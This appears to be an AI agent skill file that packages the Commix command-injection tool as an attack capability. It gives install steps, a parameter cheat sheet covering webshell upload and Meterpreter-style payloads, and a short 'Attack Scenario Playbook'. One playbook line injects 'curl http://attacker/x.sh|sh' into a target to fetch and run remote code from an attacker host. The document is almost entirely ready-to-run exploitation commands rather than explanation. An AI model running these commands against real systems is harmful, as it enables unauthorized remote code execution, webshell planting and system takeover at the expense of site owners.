---
name: commix-command-injection
description: "Commix: Automates command injection exploitation and Burp request replay. Signals: web vulnerability, injection, automatic command injection detection and exploitation, POST data."
zh-signals: "Commix: 命令注入一键 getshell、burp 请求回放利用。信号:web漏洞,注入,自动检测+利用命令注入,POST 数据。"
when-to-use: >-
  Use when testing or exploiting OS command injection in a URL parameter, POST
  body, or a saved Burp request. It automates detection and exploitation, with
  options for pseudo-shells, file upload, and reverse connections.
---

# Commix

- Attack Category: C09 Web Application Vulnerability Exploitation
- Upstream Repository: https://github.com/commixproject/commix
- Upstream License: GPL-3.0 (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)

## Installation

```bash
git clone https://github.com/commixproject/commix && cd commix
```

## Parameter Quick Reference

| Parameter / Command | Description |
| --- | --- |
| `python commix.py -u 'https://t.com/page.php?id=1'` | Automatically detect and exploit command injection |
| `--data='id=1'` | POST data |
| `--os-cmd='whoami'` | Direct command |
| `--shell` | Pseudo-terminal |
| `--level=3` | Test depth |
| `--technique=C` | Test classic injection only |
| `-r request.txt` | Burp request |
| `--batch` | Non-interactive |
| `--file-upload=shell.php` | Upload a webshell |
| `--os-pwn` | Meterpreter-style payload |

## Attack Scenario Playbook

### One-shot command injection to get a shell

```bash
python commix.py -u 'https://target/ping.php?host=127.0.0.1' --batch
python commix.py -u 'https://target/ping.php' --data='host=1' --os-cmd='curl http://attacker/x.sh|sh'
```

### Exploiting a replayed Burp request

```bash
python commix.py -r req.txt --level=2 --technique=C
```

## Notes

The command injection version of sqlmap; supports pseudo-terminal, file upload, and reverse connections; the higher the --level, the more thorough but slower the testing.
